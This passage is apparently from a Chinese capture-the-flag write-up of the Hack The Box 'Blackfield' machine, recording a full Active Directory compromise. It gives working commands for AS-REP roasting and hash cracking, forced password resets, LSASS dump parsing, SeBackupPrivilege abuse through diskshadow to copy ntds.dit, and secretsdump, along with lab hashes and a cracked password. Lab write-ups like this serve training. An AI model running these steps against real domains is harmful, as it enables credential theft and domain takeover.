CKolbo D 0 Wed Jun 3 12:47:12 2020 CMakutenas D 0 Wed Jun 3 12:47:12 2020 CMorcillo D 0 Wed Jun 3 12:47:11 2020 CSchandall D 0 Wed Jun 3 12:47:12 2020 CSelters D 0 Wed Jun 3 12:47:12 2020 CTolmie D 0 Wed Jun 3 12:47:12 2020 DCecere D 0 Wed Jun 3 12:47:12 2020 DChintalapalli D 0 Wed Jun 3 12:47:12 2020 DCwilich D 0 Wed Jun 3 12:47:12 2020 DGarbatiuc D 0 Wed Jun 3 12:47:12 2020 DKemesies D 0 Wed Jun 3 12:47:12 2020 DMatuka D 0 Wed Jun 3 12:47:12 2020 DMedeme D 0 Wed Jun 3 12:47:12 2020 DMeherek D 0 Wed Jun 3 12:47:12 2020 DMetych D 0 Wed Jun 3 12:47:12 2020 DPaskalev D 0 Wed Jun 3 12:47:12 2020 DPriporov D 0 Wed Jun 3 12:47:12 2020 DRusanovskaya D 0 Wed Jun 3 12:47:12 2020 DVellela D 0 Wed Jun 3 12:47:12 2020 DVogleson D 0 Wed Jun 3 12:47:12 2020 DZwinak D 0 Wed Jun 3 12:47:12 2020 EBoley D 0 Wed Jun 3 12:47:12 2020 EEulau D 0 Wed Jun 3 12:47:12 2020 EFeatherling D 0 Wed Jun 3 12:47:12 2020 EFrixione D 0 Wed Jun 3 12:47:12 2020 EJenorik D 0 Wed Jun 3 12:47:12 2020 EKmilanovic D 0 Wed Jun 3 12:47:12 2020 ElKatkowsky D 0 Wed Jun 3 12:47:12 2020 EmaCaratenuto D 0 Wed Jun 3 12:47:12 2020 EPalislamovic D 0 Wed Jun 3 12:47:12 2020 EPryar D 0 Wed Jun 3 12:47:12 2020 ESachhitello D 0 Wed Jun 3 12:47:12 2020 ESariotti D 0 Wed Jun 3 12:47:12 2020 ETurgano D 0 Wed Jun 3 12:47:12 2020 EWojtila D 0 Wed Jun 3 12:47:12 2020 FAlirezai D 0 Wed Jun 3 12:47:12 2020 FBaldwind D 0 Wed Jun 3 12:47:12 2020 FBroj D 0 Wed Jun 3 12:47:12 2020 FDeblaquire D 0 Wed Jun 3 12:47:12 2020 FDegeorgio D 0 Wed Jun 3 12:47:12 2020 FianLaginja D 0 Wed Jun 3 12:47:12 2020 FLasokowski D 0 Wed Jun 3 12:47:12 2020 FPflum D 0 Wed Jun 3 12:47:12 2020 FReffey D 0 Wed Jun 3 12:47:12 2020 GaBelithe D 0 Wed Jun 3 12:47:12 2020 Gareld D 0 Wed Jun 3 12:47:12 2020 GBatowski D 0 Wed Jun 3 12:47:12 2020 GForshalger D 0 Wed Jun 3 12:47:12 2020 GGomane D 0 Wed Jun 3 12:47:12 2020 GHisek D 0 Wed Jun 3 12:47:12 2020 GMaroufkhani D 0 Wed Jun 3 12:47:12 2020 GMerewether D 0 Wed Jun 3 12:47:12 2020 GQuinniey D 0 Wed Jun 3 12:47:12 2020 GRoswurm D 0 Wed Jun 3 12:47:12 2020 GWiegard D 0 Wed Jun 3 12:47:12 2020 HBlaziewske D 0 Wed Jun 3 12:47:12 2020 HColantino D 0 Wed Jun 3 12:47:12 2020 HConforto D 0 Wed Jun 3 12:47:12 2020 HCunnally D 0 Wed Jun 3 12:47:12 2020 HGougen D 0 Wed Jun 3 12:47:12 2020 HKostova D 0 Wed Jun 3 12:47:12 2020 IChristijr D 0 Wed Jun 3 12:47:12 2020 IKoledo D 0 Wed Jun 3 12:47:12 2020 IKotecky D 0 Wed Jun 3 12:47:12 2020 ISantosi D 0 Wed Jun 3 12:47:12 2020 JAngvall D 0 Wed Jun 3 12:47:12 2020 JBehmoiras D 0 Wed Jun 3 12:47:12 2020 JDanten D 0 Wed Jun 3 12:47:12 2020 JDjouka D 0 Wed Jun 3 12:47:12 2020 JKondziola D 0 Wed Jun 3 12:47:12 2020 JLeytushsenior D 0 Wed Jun 3 12:47:12 2020 JLuthner D 0 Wed Jun 3 12:47:12 2020 JMoorehendrickson D 0 Wed Jun 3 12:47:12 2020 JPistachio D 0 Wed Jun 3 12:47:12 2020 JScima D 0 Wed Jun 3 12:47:12 2020 JSebaali D 0 Wed Jun 3 12:47:12 2020 JShoenherr D 0 Wed Jun 3 12:47:12 2020 JShuselvt D 0 Wed Jun 3 12:47:12 2020 KAmavisca D 0 Wed Jun 3 12:47:12 2020 KAtolikian D 0 Wed Jun 3 12:47:12 2020 KBrokinn D 0 Wed Jun 3 12:47:12 2020 KCockeril D 0 Wed Jun 3 12:47:12 2020 KColtart D 0 Wed Jun 3 12:47:12 2020 KCyster D 0 Wed Jun 3 12:47:12 2020 KDorney D 0 Wed Jun 3 12:47:12 2020 KKoesno D 0 Wed Jun 3 12:47:12 2020 KLangfur D 0 Wed Jun 3 12:47:12 2020 KMahalik D 0 Wed Jun 3 12:47:12 2020 KMasloch D 0 Wed Jun 3 12:47:12 2020 KMibach D 0 Wed Jun 3 12:47:12 2020 KParvankova D 0 Wed Jun 3 12:47:12 2020 KPregnolato D 0 Wed Jun 3 12:47:12 2020 KRasmor D 0 Wed Jun 3 12:47:12 2020 KShievitz D 0 Wed Jun 3 12:47:12 2020 KSojdelius D 0 Wed Jun 3 12:47:12 2020 KTambourgi D 0 Wed Jun 3 12:47:12 2020 KVlahopoulos D 0 Wed Jun 3 12:47:12 2020 KZyballa D 0 Wed Jun 3 12:47:12 2020 LBajewsky D 0 Wed Jun 3 12:47:12 2020 LBaligand D 0 Wed Jun 3 12:47:12 2020 LBarhamand D 0 Wed Jun 3 12:47:12 2020 LBirer D 0 Wed Jun 3 12:47:12 2020 LBobelis D 0 Wed Jun 3 12:47:12 2020 LChippel D 0 Wed Jun 3 12:47:12 2020 LChoffin D 0 Wed Jun 3 12:47:12 2020 LCominelli D 0 Wed Jun 3 12:47:12 2020 LDruge D 0 Wed Jun 3 12:47:12 2020 LEzepek D 0 Wed Jun 3 12:47:12 2020 LHyungkim D 0 Wed Jun 3 12:47:12 2020 LKarabag D 0 Wed Jun 3 12:47:12 2020 LKirousis D 0 Wed Jun 3 12:47:12 2020 LKnade D 0 Wed Jun 3 12:47:12 2020 LKrioua D 0 Wed Jun 3 12:47:12 2020 LLefebvre D 0 Wed Jun 3 12:47:12 2020 LLoeradeavilez D 0 Wed Jun 3 12:47:12 2020 LMichoud D 0 Wed Jun 3 12:47:12 2020 LTindall D 0 Wed Jun 3 12:47:12 2020 LYturbe D 0 Wed Jun 3 12:47:12 2020 MArcynski D 0 Wed Jun 3 12:47:12 2020 MAthilakshmi D 0 Wed Jun 3 12:47:12 2020 MAttravanam D 0 Wed Jun 3 12:47:12 2020 MBrambini D 0 Wed Jun 3 12:47:12 2020 MHatziantoniou D 0 Wed Jun 3 12:47:12 2020 MHoerauf D 0 Wed Jun 3 12:47:12 2020 MKermarrec D 0 Wed Jun 3 12:47:12 2020 MKillberg D 0 Wed Jun 3 12:47:12 2020 MLapesh D 0 Wed Jun 3 12:47:12 2020 MMakhsous D 0 Wed Jun 3 12:47:12 2020 MMerezio D 0 Wed Jun 3 12:47:12 2020 MNaciri D 0 Wed Jun 3 12:47:12 2020 MShanmugarajah D 0 Wed Jun 3 12:47:12 2020 MSichkar D 0 Wed Jun 3 12:47:12 2020 MTemko D 0 Wed Jun 3 12:47:12 2020 MTipirneni D 0 Wed Jun 3 12:47:12 2020 MTonuri D 0 Wed Jun 3 12:47:12 2020 MVanarsdel D 0 Wed Jun 3 12:47:12 2020 NBellibas D 0 Wed Jun 3 12:47:12 2020 NDikoka D 0 Wed Jun 3 12:47:12 2020 NGenevro D 0 Wed Jun 3 12:47:12 2020 NGoddanti D 0 Wed Jun 3 12:47:12 2020 NMrdirk D 0 Wed Jun 3 12:47:12 2020 NPulido D 0 Wed Jun 3 12:47:12 2020 NRonges D 0 Wed Jun 3 12:47:12 2020 NSchepkie D 0 Wed Jun 3 12:47:12 2020 NVanpraet D 0 Wed Jun 3 12:47:12 2020 OBelghazi D 0 Wed Jun 3 12:47:12 2020 OBushey D 0 Wed Jun 3 12:47:12 2020 OHardybala D 0 Wed Jun 3 12:47:12 2020 OLunas D 0 Wed Jun 3 12:47:12 2020 ORbabka D 0 Wed Jun 3 12:47:12 2020 PBourrat D 0 Wed Jun 3 12:47:12 2020 PBozzelle D 0 Wed Jun 3 12:47:12 2020 PBranti D 0 Wed Jun 3 12:47:12 2020 PCapperella D 0 Wed Jun 3 12:47:12 2020 PCurtz D 0 Wed Jun 3 12:47:12 2020 PDoreste D 0 Wed Jun 3 12:47:12 2020 PGegnas D 0 Wed Jun 3 12:47:12 2020 PMasulla D 0 Wed Jun 3 12:47:12 2020 PMendlinger D 0 Wed Jun 3 12:47:12 2020 PParakat D 0 Wed Jun 3 12:47:12 2020 PProvencer D 0 Wed Jun 3 12:47:12 2020 PTesik D 0 Wed Jun 3 12:47:12 2020 PVinkovich D 0 Wed Jun 3 12:47:12 2020 PVirding D 0 Wed Jun 3 12:47:12 2020 PWeinkaus D 0 Wed Jun 3 12:47:12 2020 RBaliukonis D 0 Wed Jun 3 12:47:12 2020 RBochare D 0 Wed Jun 3 12:47:12 2020 RKrnjaic D 0 Wed Jun 3 12:47:12 2020 RNemnich D 0 Wed Jun 3 12:47:12 2020 RPoretsky D 0 Wed Jun 3 12:47:12 2020 RStuehringer D 0 Wed Jun 3 12:47:12 2020 RSzewczuga D 0 Wed Jun 3 12:47:12 2020 RVallandas D 0 Wed Jun 3 12:47:12 2020 RWeatherl D 0 Wed Jun 3 12:47:12 2020 RWissor D 0 Wed Jun 3 12:47:12 2020 SAbdulagatov D 0 Wed Jun 3 12:47:12 2020 SAjowi D 0 Wed Jun 3 12:47:12 2020 SAlguwaihes D 0 Wed Jun 3 12:47:12 2020 SBonaparte D 0 Wed Jun 3 12:47:12 2020 SBouzane D 0 Wed Jun 3 12:47:12 2020 SChatin D 0 Wed Jun 3 12:47:12 2020 SDellabitta D 0 Wed Jun 3 12:47:12 2020 SDhodapkar D 0 Wed Jun 3 12:47:12 2020 SEulert D 0 Wed Jun 3 12:47:12 2020 SFadrigalan D 0 Wed Jun 3 12:47:12 2020 SGolds D 0 Wed Jun 3 12:47:12 2020 SGrifasi D 0 Wed Jun 3 12:47:12 2020 SGtlinas D 0 Wed Jun 3 12:47:12 2020 SHauht D 0 Wed Jun 3 12:47:12 2020 SHederian D 0 Wed Jun 3 12:47:12 2020 SHelregel D 0 Wed Jun 3 12:47:12 2020 SKrulig D 0 Wed Jun 3 12:47:12 2020 SLewrie D 0 Wed Jun 3 12:47:12 2020 SMaskil D 0 Wed Jun 3 12:47:12 2020 Smocker D 0 Wed Jun 3 12:47:12 2020 SMoyta D 0 Wed Jun 3 12:47:12 2020 SRaustiala D 0 Wed Jun 3 12:47:12 2020 SReppond D 0 Wed Jun 3 12:47:12 2020 SSicliano D 0 Wed Jun 3 12:47:12 2020 SSilex D 0 Wed Jun 3 12:47:12 2020 SSolsbak D 0 Wed Jun 3 12:47:12 2020 STousignaut D 0 Wed Jun 3 12:47:12 2020 support D 0 Wed Jun 3 12:47:12 2020 svc_backup D 0 Wed Jun 3 12:47:12 2020 SWhyte D 0 Wed Jun 3 12:47:12 2020 SWynigear D 0 Wed Jun 3 12:47:12 2020 TAwaysheh D 0 Wed Jun 3 12:47:12 2020 TBadenbach D 0 Wed Jun 3 12:47:12 2020 TCaffo D 0 Wed Jun 3 12:47:12 2020 TCassalom D 0 Wed Jun 3 12:47:12 2020 TEiselt D 0 Wed Jun 3 12:47:12 2020 TFerencdo D 0 Wed Jun 3 12:47:12 2020 TGaleazza D 0 Wed Jun 3 12:47:12 2020 TKauten D 0 Wed Jun 3 12:47:12 2020 TKnupke D 0 Wed Jun 3 12:47:12 2020 TLintlop D 0 Wed Jun 3 12:47:12 2020 TMusselli D 0 Wed Jun 3 12:47:12 2020 TOust D 0 Wed Jun 3 12:47:12 2020 TSlupka D 0 Wed Jun 3 12:47:12 2020 TStausland D 0 Wed Jun 3 12:47:12 2020 TZumpella D 0 Wed Jun 3 12:47:12 2020 UCrofskey D 0 Wed Jun 3 12:47:12 2020 UMarylebone D 0 Wed Jun 3 12:47:12 2020 UPyrke D 0 Wed Jun 3 12:47:12 2020 VBublavy D 0 Wed Jun 3 12:47:12 2020 VButziger D 0 Wed Jun 3 12:47:12 2020 VFuscca D 0 Wed Jun 3 12:47:12 2020 VLitschauer D 0 Wed Jun 3 12:47:12 2020 VMamchuk D 0 Wed Jun 3 12:47:12 2020 VMarija D 0 Wed Jun 3 12:47:12 2020 VOlaosun D 0 Wed Jun 3 12:47:12 2020 VPapalouca D 0 Wed Jun 3 12:47:12 2020 WSaldat D 0 Wed Jun 3 12:47:12 2020 WVerzhbytska D 0 Wed Jun 3 12:47:12 2020 WZelazny D 0 Wed Jun 3 12:47:12 2020 XBemelen D 0 Wed Jun 3 12:47:12 2020 XDadant D 0 Wed Jun 3 12:47:12 2020 XDebes D 0 Wed Jun 3 12:47:12 2020 XKonegni D 0 Wed Jun 3 12:47:12 2020 XRykiel D 0 Wed Jun 3 12:47:12 2020 YBleasdale D 0 Wed Jun 3 12:47:12 2020 YHuftalin D 0 Wed Jun 3 12:47:12 2020 YKivlen D 0 Wed Jun 3 12:47:12 2020 YKozlicki D 0 Wed Jun 3 12:47:12 2020 YNyirenda D 0 Wed Jun 3 12:47:12 2020 YPredestin D 0 Wed Jun 3 12:47:12 2020 YSeturino D 0 Wed Jun 3 12:47:12 2020 YSkoropada D 0 Wed Jun 3 12:47:12 2020 YVonebers D 0 Wed Jun 3 12:47:12 2020 YZarpentine D 0 Wed Jun 3 12:47:12 2020 ZAlatti D 0 Wed Jun 3 12:47:12 2020 ZKrenselewski D 0 Wed Jun 3 12:47:12 2020 ZMalaab D 0 Wed Jun 3 12:47:12 2020 ZMiick D 0 Wed Jun 3 12:47:12 2020 ZScozzari D 0 Wed Jun 3 12:47:12 2020 ZTimofeeff D 0 Wed Jun 3 12:47:12 2020 ZWausik D 0 Wed Jun 3 12:47:12 2020 7846143 blocks of size 4096. 3829343 blocks availablesmb: \\&gt; usernames所以就是处理一下作为用户名字典： 1234awk '&#123;print $1&#125;' users.txt &gt; usernames.txtwc -l usernames.txt315 usernames.txt GetNPuser使用GetNPuser.py，获取tgt，最终得到了support用户的TGT，然后还需要破解： 1234python ~/Tools/impacket/examples/GetNPUsers.py BLACKFIELD.LOCAL/ -usersfile usernames.txt -format john -outputfile hashes.txt -dc-ip 10.10.10.192cat hashes.txt$krb5asrep$support@BLACKFIELD.LOCAL:05942c2c3ca3f4c8176fbfe8c096c070$f6943aaa7f1d4512f8e6413cf1e423ddcc0880feddde62433c037eeb676d7a63c55521651436385b4c270a926b0e11005d1a34ca814b69af8a74123134e382d0001bbe540503745ce93ff7af3a361093638b3464cf704e942fc8bdf0d1d5dec7a5097ca2fdb9f37b93bfaca1ae392b4a79a5f2ea88b73603f2bd8333e74332acf927d81f975c79768cce49e0f556d8d87c2792304a004f1514160f800d3a82cc1f730301f78b21475df46f1ab09e779c684e20e3cb024fd508661b8f67331a030629dcc355211861c45343aa579c63db63c1f7c412f346f2193f3be4d31fbe22b104dded43d8029954e029802e887c7b32a9576a john123sudo john hashes.txt -w=/usr/share/wordlists/rockyou.txt#00^BlackKnight ($krb5asrep$support@BLACKFIELD.LOCAL) 破解出support用户密码：#00^BlackKnight rpcclient然后这个用户可以RPC登录 enumdomusers1234567891011rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[audit2020] rid:[0x44f]user:[support] rid:[0x450]user:[BLACKFIELD764430] rid:[0x451]...#全都是BLACKFIELD加数字这种无效用户user:[BLACKFIELD438814] rid:[0x584]user:[svc_backup] rid:[0x585]user:[lydericlefebvre] rid:[0x586] enumprivs1234567891011121314151617181920212223242526272829303132333435363738rpcclient $&gt; enumprivsfound 35 privilegesSeCreateTokenPrivilege 0:2 (0x0:0x2)SeAssignPrimaryTokenPrivilege 0:3 (0x0:0x3)SeLockMemoryPrivilege 0:4 (0x0:0x4)SeIncreaseQuotaPrivilege 0:5 (0x0:0x5)SeMachineAccountPrivilege 0:6 (0x0:0x6)SeTcbPrivilege 0:7 (0x0:0x7)SeSecurityPrivilege 0:8 (0x0:0x8)SeTakeOwnershipPrivilege 0:9 (0x0:0x9)SeLoadDriverPrivilege 0:10 (0x0:0xa)SeSystemProfilePrivilege 0:11 (0x0:0xb)SeSystemtimePrivilege 0:12 (0x0:0xc)SeProfileSingleProcessPrivilege 0:13 (0x0:0xd)SeIncreaseBasePriorityPrivilege 0:14 (0x0:0xe)SeCreatePagefilePrivilege 0:15 (0x0:0xf)SeCreatePermanentPrivilege 0:16 (0x0:0x10)SeBackupPrivilege 0:17 (0x0:0x11)SeRestorePrivilege 0:18 (0x0:0x12)SeShutdownPrivilege 0:19 (0x0:0x13)SeDebugPrivilege 0:20 (0x0:0x14)SeAuditPrivilege 0:21 (0x0:0x15)SeSystemEnvironmentPrivilege 0:22 (0x0:0x16)SeChangeNotifyPrivilege 0:23 (0x0:0x17)SeRemoteShutdownPrivilege 0:24 (0x0:0x18)SeUndockPrivilege 0:25 (0x0:0x19)SeSyncAgentPrivilege 0:26 (0x0:0x1a)SeEnableDelegationPrivilege 0:27 (0x0:0x1b)SeManageVolumePrivilege 0:28 (0x0:0x1c)SeImpersonatePrivilege 0:29 (0x0:0x1d)SeCreateGlobalPrivilege 0:30 (0x0:0x1e)SeTrustedCredManAccessPrivilege 0:31 (0x0:0x1f)SeRelabelPrivilege 0:32 (0x0:0x20)SeIncreaseWorkingSetPrivilege 0:33 (0x0:0x21)SeTimeZonePrivilege 0:34 (0x0:0x22)SeCreateSymbolicLinkPrivilege 0:35 (0x0:0x23)SeDelegateSessionUserImpersonatePrivilege 0:36 (0x0:0x24) support用户有权限重置其他普通用户密码，参考： Reset AD user password with Linux :: malicious.link — welcomehttps://malicious.link/post/2017/reset-ad-user-password-with-linux/ audit2020我们可以重置audit2020用户密码： 1rpcclient $&gt; setuserinfo2 audit2020 23 'abcd@1234' 然后这个用户有权限访问SMB共享forensic目录： 123456789101112smbclient //10.10.10.192/forensic -U audit2020Enter WORKGROUP\\audit2020's password:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Sun Feb 23 08:03:16 2020 .. D 0 Sun Feb 23 08:03:16 2020 commands_output D 0 Sun Feb 23 13:14:37 2020 memory_analysis D 0 Thu May 28 16:28:33 2020 tools D 0 Sun Feb 23 08:39:08 2020 7846143 blocks of size 4096. 3958682 blocks availablesmb: \\&gt; forensiclsass.zipmemory_analysis目录有个lsass.zip文件，这个文件非常大，下载失败就重试吧,解压出来是一个内存dump文件： Some ways to dump LSASS.exe. As always this is for educational… | by Mark Mo | Mediumhttps://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf 123456smb: \\memory_analysis\\&gt; get lsass.zipgetting file \\memory_analysis\\lsass.zip of size 41936098 as lsass.zip (1352.5 KiloBytes/sec) (average 1352.5 KiloBytes/sec)➜ Blackfield unzip lsass.zipArchive: lsass.zip inflating: lsass.DMP extract windows用mimikatz比较方便，我这里用的pypykatz： https://github.com/skelsec/pypykatz Extract credentials from lsass remotely - hackndohttps://en.hackndo.com/remote-lsass-dump-passwords/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576pypykatz lsa minidump lsass.DMPINFO:root:Parsing file lsass.DMPFILE: ======== lsass.DMP ========= LogonSession ==authentication_id 406458 (633ba)session_id 2username svc_backupdomainname BLACKFIELDlogon_server DC01logon_time 2020-02-23T18:00:03.423728+00:00sid S-1-5-21-4194615774-2175524697-3563712290-1413luid 406458 == MSV == Username: svc_backup Domain: BLACKFIELD LM: NA NT: 9658d1d1dcd9250115e2205d9f48400d SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c == WDIGEST [633ba]== username svc_backup domainname BLACKFIELD password None == SSP [633ba]== username domainname password None == Kerberos == Username: svc_backup Domain: BLACKFIELD.LOCAL Password: None == WDIGEST [633ba]== username svc_backup domainname BLACKFIELD password None...== LogonSession ==authentication_id 153705 (25869)session_id 1username Administratordomainname BLACKFIELDlogon_server DC01logon_time 2020-02-23T17:59:04.506080+00:00sid S-1-5-21-4194615774-2175524697-3563712290-500luid 153705 == MSV == Username: Administrator Domain: BLACKFIELD LM: NA NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368 == WDIGEST [25869]== username Administrator domainname BLACKFIELD password None == SSP [25869]== username domainname password None == Kerberos == Username: Administrator Domain: BLACKFIELD.LOCAL Password: None == WDIGEST [25869]== username Administrator domainname BLACKFIELD password None == DPAPI [25869]== luid 153705 key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5 sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9... 得到svc_backup和administrator的hash，administrator的直接用失败，svc_backup的可以用： 12svc_backup ： 9658d1d1dcd9250115e2205d9f48400dadministrator ： 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 user flag使用svc_backup登录，在桌面得到user.txt: 提权信息whoami /all1234567891011121314151617181920212223242526272829303132333435363738394041424344USER INFORMATION----------------User Name SID===================== ==============================================blackfield\\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413GROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ ============ ==================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled. 注意这个用户在BUILTIN\\Backup Operators组里，并且有 1SeBackupPrivilege Back up files and directories Enabled 权限，那么我们需要做的就是备份NTDS.dit文件和system注册表文件。 diskshadow主要就是卷影备份，我们创建一个文件，里面是执行diskshadow时运行的命令： 123456789101112131415*Evil-WinRM* PS C:\\temp&gt; upload miao.txtInfo: Uploading miao.txt to C:\\temp\\miao.txtData: 124 bytes of 124 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\temp&gt; type miao.txtSET CONTEXT PERSISTENT NOWRITERSadd volume c: alias miaocreateexpose %miao% z:*Evil-WinRM* PS C:\\temp&gt; 然后执行这个脚本： 12345678910111213141516*Evil-WinRM* PS C:\\temp&gt; diskshadow /s miao.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer: DC01, 8/4/2020 7:06:03 AM-&gt; SET CONTEXT PERSISTENT NOWRITERSET CONTEXT &#123; CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] &#125; CLIENTACCESSIBLE Specify to create shadow copies usable by client versions of Windows. PERSISTENT Specify that shadow copy is persist across program exit, reset or reboot. PERSISTENT NOWRITERS Specify that shadow copy is persistent and all writers are excluded. VOLATILE Specify that shadow copy will be deleted on exit or reset. VOLATILE NOWRITERS Specify that shadow copy is volatile and all writers are excluded. Example: SET CONTEXT CLIENTACCESSIBLE 我们在每一个行都添加一个字符，然后再次上传： 12345678910111213*Evil-WinRM* PS C:\\temp&gt; upload miao.txtInfo: Uploading miao.txt to C:\\temp\\miao.txtData: 116 bytes of 116 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\temp&gt; type miao.txtSET CONTEXT PERSISTENT NOWRITERS#add volume c: alias miao#create#expose %miao% z:# 这次成功执行： 1234567891011121314151617181920212223242526272829*Evil-WinRM* PS C:\\temp&gt; diskshadow /s miao.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer: DC01, 8/4/2020 7:11:15 AM-&gt; SET CONTEXT PERSISTENT NOWRITERS-&gt; add volume c: alias miao-&gt; createAlias miao for shadow ID &#123;14f68d2c-dbf0-4077-98b3-5d18ffc48c9c&#125; set as environment variable.Alias VSS_SHADOW_SET for shadow set ID &#123;253f50b3-b12d-44e3-b628-43196525e8b6&#125; set as environment variable.Querying all shadow copies with the shadow copy set ID &#123;253f50b3-b12d-44e3-b628-43196525e8b6&#125; * Shadow copy ID = &#123;14f68d2c-dbf0-4077-98b3-5d18ffc48c9c&#125; %miao% - Shadow copy set: &#123;253f50b3-b12d-44e3-b628-43196525e8b6&#125; %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume&#123;351b4712-0000-0000-0000-602200000000&#125;\\ [C:\\] - Creation time: 8/4/2020 7:11:17 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125; - Attributes: No_Auto_Release Persistent No_Writers DifferentialNumber of shadow copies listed: 1-&gt; expose %miao% z:-&gt; %miao% = &#123;14f68d2c-dbf0-4077-98b3-5d18ffc48c9c&#125;The shadow copy was successfully exposed as z:\\. NTDS.dit然后就是复制NTDS.dit文件，这里是用到的文件： https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug 上传这两个dll文件： 1234567891011121314151617*Evil-WinRM* PS C:\\temp&gt; upload SeBackupPrivilegeCmdLets.dllInfo: Uploading SeBackupPrivilegeCmdLets.dll to C:\\temp\\SeBackupPrivilegeCmdLets.dllData: 16384 bytes of 16384 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\temp&gt; upload SeBackupPrivilegeUtils.dllInfo: Uploading SeBackupPrivilegeUtils.dll to C:\\temp\\SeBackupPrivilegeUtils.dllData: 21844 bytes of 21844 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\temp&gt; 导入后，把NTDS.dit文件复制出来： 12345678910111213141516171819*Evil-WinRM* PS C:\\temp&gt; import-module .\\SeBackupPrivilegeUtils.dll*Evil-WinRM* PS C:\\temp&gt; import-module .\\SeBackupPrivilegeCmdLets.dll*Evil-WinRM* PS C:\\temp&gt; Copy-FileSebackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\temp\\ndts.dit*Evil-WinRM* PS C:\\temp&gt; dir Directory: C:\\tempMode LastWriteTime Length Name---- ------------- ------ -----a---- 8/4/2020 7:11 AM 625 2020-08-04_7-11-17_DC01.cab-a---- 8/4/2020 7:10 AM 87 miao.txt-a---- 8/4/2020 7:19 AM 18874368 ndts.dit-a---- 8/4/2020 7:17 AM 12288 SeBackupPrivilegeCmdLets.dll-a---- 8/4/2020 7:17 AM 16384 SeBackupPrivilegeUtils.dll*Evil-WinRM* PS C:\\temp&gt; system注册表注册表就直接导出，然后下载system和ndts.dit文件(前面导出的文件名字母顺序错了，影响不大)： 12345678910111213141516*Evil-WinRM* PS C:\\temp&gt; reg save HKLM\\SYSTEM c:\\temp\\systemThe operation completed successfully.*Evil-WinRM* PS C:\\temp&gt; download systemInfo: Downloading C:\\temp\\system to systemInfo: Download successful!*Evil-WinRM* PS C:\\temp&gt; download ndts.ditInfo: Downloading C:\\temp\\ndts.dit to ndts.ditInfo: Download successful!*Evil-WinRM* PS C:\\temp&gt; Dump NTLM然后就是通过ntds.dit和system dump NTLM： 1234567891011121314 python3 &#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash &gt; dump.txt # 因为前面也看到很多无效账号，输出非常多head dump.txtImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c[*] Reading and decrypting hashes from ndts.ditAdministrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6::: 得到了Administrator的NTLM： 1Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: root flag直接用administrator的hash登录，桌面得到root.txt: 参考资料 https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf Reset 